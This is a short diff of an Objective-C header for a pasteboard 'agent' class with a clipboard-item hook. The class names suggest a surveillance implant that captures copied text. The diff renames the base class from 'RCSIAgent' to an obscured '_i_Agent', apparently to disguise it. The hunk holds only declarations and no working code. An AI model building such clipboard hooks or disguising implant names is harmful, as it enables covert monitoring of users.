@@ -13,7 +13,7 @@
 
 NSData* getPastebordText(NSArray* items);
 
-@interface agentPasteboard : RCSIAgent
+@interface agentPasteboard : _i_Agent
 
 - (void)addItemsHook:(NSArray *)items;
 
